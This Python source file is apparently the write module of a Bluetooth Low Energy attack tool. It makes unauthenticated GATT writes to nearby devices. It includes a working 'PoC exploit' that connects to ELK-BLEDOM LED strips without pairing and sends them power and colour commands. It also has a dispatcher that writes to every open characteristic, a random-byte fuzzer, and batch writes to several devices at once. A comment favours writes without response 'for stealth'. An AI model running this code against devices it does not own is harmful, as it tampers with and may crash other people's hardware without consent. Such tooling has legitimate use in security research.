"""
air-bt — BLE Write Engine
Attempts unauthenticated writes on discovered open characteristics.
Supports: single write, batch write, payload library, custom hex, fuzz mode.
Created by InnerFireZ — https://github.com/InnerFireZ/air-bt
"""

import asyncio
import logging
import os
import random
from dataclasses import dataclass
from datetime import datetime

from bleak import BleakClient, BleakError
from bleak.backends.characteristic import BleakGATTCharacteristic

from models import BTDevice, GATTCharacteristic
from payloads.library import Payload, get_payloads_for_protocol, PAYLOAD_LIBRARY, elk_bledom_rgb
# poc imported lazily to avoid circular import

# ELK-BLEDOM known write characteristic UUIDs (primary + alt variant)
_ELK_WRITE_UUIDS = [
    "0000fff3-0000-1000-8000-00805f9b34fb",
    "0000ffe9-0000-1000-8000-00805f9b34fb",
    "0000ffb2-0000-1000-8000-00805f9b34fb",
]

# Rainbow color sequence: name → (R, G, B)
_RAINBOW_STEPS = [
    ("Red",     255,   0,   0),
    ("Orange",  255, 100,   0),
    ("Yellow",  255, 220,   0),
    ("Green",     0, 255,   0),
    ("Cyan",      0, 255, 200),
    ("Blue",      0,   0, 255),
    ("Violet",  140,   0, 255),
    ("Magenta", 255,   0, 180),
    ("White",   255, 255, 255),
]

# ELK-BLEDOM command bytes
_CMD_POWER_ON     = bytes.fromhex("7e0004f00001ff00ef")
_CMD_POWER_OFF    = bytes.fromhex("7e0004f00000ff00ef")
_CMD_RAINBOW_AUTO = bytes.fromhex("7e000302870000000001ef")  # built-in rainbow cycle effect
_CMD_STROBE       = bytes.fromhex("7e000302280000000001ef")
_CMD_REQUEST_STATE = bytes.fromhex("ef0177")

log = logging.getLogger("air-bt.writer")

CONNECT_TIMEOUT = 10.0
WRITE_TIMEOUT = 5.0


@dataclass
class WriteResult:
    mac: str
    char_uuid: str
    payload: bytes
    success: bool
    response: bytes | None
    error: str | None
    timestamp: datetime = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

    def __str__(self):
        status = "OK" if self.success else f"FAIL({self.error})"
        resp = self.response.hex() if self.response else "-"
        return f"[{self.timestamp.strftime('%H:%M:%S')}] {self.mac} UUID={self.char_uuid} DATA={self.payload.hex()} → {status} RESP={resp}"


async def write_characteristic(
    client: BleakClient,
    char: GATTCharacteristic,
    data: bytes,
    use_response: bool = False,
) -> WriteResult:
    """Write data to a single characteristic. Tries write-with-response then without."""
    try:
        # Prefer WRITE_NO_RESPONSE for stealth; fall back to WRITE if needed
        if "write-without-response" in char.properties and not use_response:
            await asyncio.wait_for(
                client.write_gatt_char(char.handle, data, response=False),
                timeout=WRITE_TIMEOUT,
            )
        elif "write" in char.properties:
            resp_bytes = await asyncio.wait_for(
                client.write_gatt_char(char.handle, data, response=True),
                timeout=WRITE_TIMEOUT,
            )
            return WriteResult(
                mac=str(client.address),
                char_uuid=char.uuid,
                payload=data,
                success=True,
                response=bytes(resp_bytes) if resp_bytes else None,
                error=None,
            )
        else:
            return WriteResult(
                mac=str(client.address),
                char_uuid=char.uuid,
                payload=data,
                success=False,
                response=None,
                error="No write property",
            )

        return WriteResult(
            mac=str(client.address),
            char_uuid=char.uuid,
            payload=data,
            success=True,
            response=None,
            error=None,
        )

    except asyncio.TimeoutError:
        return WriteResult(
            mac=str(client.address), char_uuid=char.uuid, payload=data,
            success=False, response=None, error="timeout",
        )
    except BleakError as e:
        return WriteResult(
            mac=str(client.address), char_uuid=char.uuid, payload=data,
            success=False, response=None, error=str(e),
        )
    except Exception as e:
        return WriteResult(
            mac=str(client.address), char_uuid=char.uuid, payload=data,
            success=False, response=None, error=str(e),
        )


async def run_payload(
    dev: BTDevice,
    payload: Payload,
    timeout: float = CONNECT_TIMEOUT,
) -> WriteResult:
    """Execute a single named payload against a device."""
    # Find the characteristic matching the payload's UUID
    target_char = None
    for char in dev.all_characteristics():
        if char.uuid.lower() == payload.target_uuid.lower():
            target_char = char
            break

    if target_char is None:
        # UUID not yet enumerated — try anyway by UUID string
        target_char = GATTCharacteristic(
            uuid=payload.target_uuid,
            handle=0,
            properties=["write", "write-without-response"],
        )

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                return WriteResult(
                    mac=dev.mac, char_uuid=payload.target_uuid, payload=payload.data,
                    success=False, response=None, error="connection failed",
                )
            return await write_characteristic(
                client, target_char, payload.data,
                use_response=payload.requires_response,
            )
    except Exception as e:
        return WriteResult(
            mac=dev.mac, char_uuid=payload.target_uuid, payload=payload.data,
            success=False, response=None, error=str(e),
        )


async def _elk_raw_write(client: BleakClient, write_uuid: str, data: bytes):
    """Write raw bytes to an ELK-BLEDOM char (by UUID string, no handle needed)."""
    await asyncio.wait_for(
        client.write_gatt_char(write_uuid, data, response=False),
        timeout=WRITE_TIMEOUT,
    )


async def elk_bledom_rainbow_poc(
    dev: BTDevice,
    timeout: float = CONNECT_TIMEOUT,
    step_delay: float = 0.35,
    cycles: int = 2,
    log_cb=None,
) -> list[WriteResult]:
    """
    ELK-BLEDOM PoC exploit — rainbow light show on any nearby LED strip.

    Steps:
      1. Connect without pairing
      2. Power ON
      3. Cycle through rainbow colors (cycles x 9 colors)
      4. Leave in built-in rainbow auto-effect mode
      5. Log every step

    Works without prior GATT enumeration — writes directly to known UUID.
    log_cb(msg: str) is called for each step if provided.
    """
    results: list[WriteResult] = []

    def _log(msg: str):
        log.info(msg)
        if log_cb:
            log_cb(msg)

    _log(f"[ELK-BLEDOM] Connecting to {dev.mac} ({dev.name}) ...")

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                _log(f"[ELK-BLEDOM] ✗ Could not connect to {dev.mac}")
                return []

            _log(f"[ELK-BLEDOM] ✓ Connected — starting rainbow PoC")

            # Find which write UUID is available on this device
            write_uuid = None
            if dev.gatt_enumerated:
                for uuid in _ELK_WRITE_UUIDS:
                    if any(c.uuid.lower() == uuid for c in dev.all_characteristics()):
                        write_uuid = uuid
                        break

            if write_uuid is None:
                # Try each known UUID blindly (no prior enumeration needed)
                for uuid in _ELK_WRITE_UUIDS:
                    try:
                        await asyncio.wait_for(
                            client.write_gatt_char(uuid, _CMD_POWER_ON, response=False),
                            timeout=3.0,
                        )
                        write_uuid = uuid
                        _log(f"[ELK-BLEDOM] ✓ Active write UUID: {uuid}")
                        break
                    except Exception:
                        continue

            if write_uuid is None:
                _log(f"[ELK-BLEDOM] ✗ No writable LED char found on {dev.mac}")
                return []

            # ── Step 1: Power ON ────────────────────────────────────────────
            try:
                await _elk_raw_write(client, write_uuid, _CMD_POWER_ON)
                results.append(WriteResult(
                    mac=dev.mac, char_uuid=write_uuid, payload=_CMD_POWER_ON,
                    success=True, response=None, error=None,
                ))
                _log(f"[ELK-BLEDOM] ► Power ON sent")
                await asyncio.sleep(0.3)
            except Exception as e:
                _log(f"[ELK-BLEDOM] ✗ Power ON failed: {e}")
                return results

            # ── Step 2: Rainbow color cycle ─────────────────────────────────
            _log(f"[ELK-BLEDOM] ► Starting rainbow cycle ({cycles}x {len(_RAINBOW_STEPS)} colors) ...")
            for cycle in range(cycles):
                for color_name, r, g, b in _RAINBOW_STEPS:
                    cmd = bytes([0x7e, 0x00, 0x05, 0x03, r, g, b, 0x00, 0x00, 0xef])
                    try:
                        await _elk_raw_write(client, write_uuid, cmd)
                        results.append(WriteResult(
                            mac=dev.mac, char_uuid=write_uuid, payload=cmd,
                            success=True, response=None, error=None,
                        ))
                        _log(f"[ELK-BLEDOM]   cycle {cycle+1}/{cycles} → {color_name} ({r},{g},{b})")
                    except Exception as e:
                        results.append(WriteResult(
                            mac=dev.mac, char_uuid=write_uuid, payload=cmd,
                            success=False, response=None, error=str(e),
                        ))
                        _log(f"[ELK-BLEDOM]   ✗ {color_name} failed: {e}")
                    await asyncio.sleep(step_delay)

            # ── Step 3: Leave in rainbow auto-effect mode ───────────────────
            try:
                await _elk_raw_write(client, write_uuid, _CMD_RAINBOW_AUTO)
                results.append(WriteResult(
                    mac=dev.mac, char_uuid=write_uuid, payload=_CMD_RAINBOW_AUTO,
                    success=True, response=None, error=None,
                ))
                _log(f"[ELK-BLEDOM] ✓ Rainbow auto-effect activated — PoC complete on {dev.mac}")
            except Exception as e:
                _log(f"[ELK-BLEDOM] ✗ Rainbow auto-effect failed: {e}")

    except asyncio.TimeoutError:
        _log(f"[ELK-BLEDOM] ✗ Connection timeout: {dev.mac}")
    except BleakError as e:
        _log(f"[ELK-BLEDOM] ✗ BLE error: {e}")
    except Exception as e:
        _log(f"[ELK-BLEDOM] ✗ Unexpected error: {e}")

    return results


async def exploit_open_writes(
    dev: BTDevice,
    custom_data: bytes | None = None,
    timeout: float = CONNECT_TIMEOUT,
    log_cb=None,
) -> list[WriteResult]:
    """
    Attempt writes on all open (no-auth) writable characteristics.
    Protocol-aware: ELK-BLEDOM devices get the rainbow PoC automatically.
    If custom_data is None, uses protocol-matched payload library first,
    then falls back to a generic probe byte.
    """
    # ── ELK-BLEDOM: run dedicated rainbow PoC ────────────────────────────────
    # Detect by protocol name OR by presence of known ELK-BLEDOM service UUIDs
    _elk_svc_uuids = {"0000fff0-0000-1000-8000-00805f9b34fb",
                      "0000ffe5-0000-1000-8000-00805f9b34fb",
                      "0000ffb0-0000-1000-8000-00805f9b34fb"}
    _found_elk_uuids = {s.uuid.lower() for s in dev.services} & _elk_svc_uuids
    _is_elk = dev.protocol == "ELK-BLEDOM" or bool(_found_elk_uuids) or \
              any(kw in dev.name.lower() for kw in [
                  "elk-ble", "elk-bulb", "elk-lamp", "elkblue", "melk",
                  "ledble", "lednet", "led_ble", "ledstrip", "qhm-led",
                  "triones", "magic home", "ilinker", "btle-led", "ble-led",
              ])

    if _is_elk and custom_data is None:
        if dev.protocol != "ELK-BLEDOM":
            dev.protocol = "ELK-BLEDOM"   # fix protocol label in TUI
        return await elk_bledom_rainbow_poc(dev, timeout=timeout, log_cb=log_cb)

    # ── Smart PoC dispatcher for known device classes ─────────────────────────
    if custom_data is None and dev.gatt_enumerated:
        from scanner.poc import run_best_poc
        return await run_best_poc(dev, timeout=timeout, log_cb=log_cb)

    open_chars = dev.open_write_chars()
    if not open_chars:
        log.info(f"{dev.mac}: no open write characteristics found")
        return []

    results: list[WriteResult] = []
    protocol_payloads = {p.target_uuid.lower(): p for p in get_payloads_for_protocol(dev.protocol)}

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                log.warning(f"Could not connect to {dev.mac}")
                return []

            for char in open_chars:
                uuid_lower = char.uuid.lower()
                if custom_data:
                    data = custom_data
                elif uuid_lower in protocol_payloads:
                    data = protocol_payloads[uuid_lower].data
                else:
                    # Generic probe
                    data = bytes([0x01])

                result = await write_characteristic(client, char, data)
                results.append(result)
                log.info(str(result))

                # Short delay between writes
                await asyncio.sleep(0.1)

    except Exception as e:
        log.warning(f"Write session error {dev.mac}: {e}")

    return results


async def fuzz_characteristic(
    dev: BTDevice,
    char_uuid: str,
    iterations: int = 50,
    min_len: int = 1,
    max_len: int = 20,
    timeout: float = CONNECT_TIMEOUT,
) -> list[WriteResult]:
    """
    Fuzz a specific characteristic with random payloads.
    Logs all results including crashes (no response after successful connect).
    """
    target_char = None
    for char in dev.all_characteristics():
        if char.uuid.lower() == char_uuid.lower():
            target_char = char
            break

    if target_char is None:
        target_char = GATTCharacteristic(
            uuid=char_uuid, handle=0,
            properties=["write", "write-without-response"],
        )

    results: list[WriteResult] = []

    try:
        async with BleakClient(dev.mac, timeout=timeout, pair=False) as client:
            if not client.is_connected:
                return []

            for i in range(iterations):
                length = random.randint(min_len, max_len)
                data = os.urandom(length)
                result = await write_characteristic(client, target_char, data)
                results.append(result)
                log.debug(f"Fuzz {i+1}/{iterations}: {result}")
                await asyncio.sleep(0.05)

    except Exception as e:
        log.warning(f"Fuzz session ended {dev.mac}: {e}")

    return results


async def batch_write(
    devices: list[BTDevice],
    payload: Payload,
    delay: float = 0.0,
) -> dict[str, WriteResult]:
    """Write the same payload to multiple devices concurrently."""
    tasks = {dev.mac: run_payload(dev, payload) for dev in devices}
    results = {}
    for mac, coro in tasks.items():
        results[mac] = await coro
        if delay:
            await asyncio.sleep(delay)
    return results
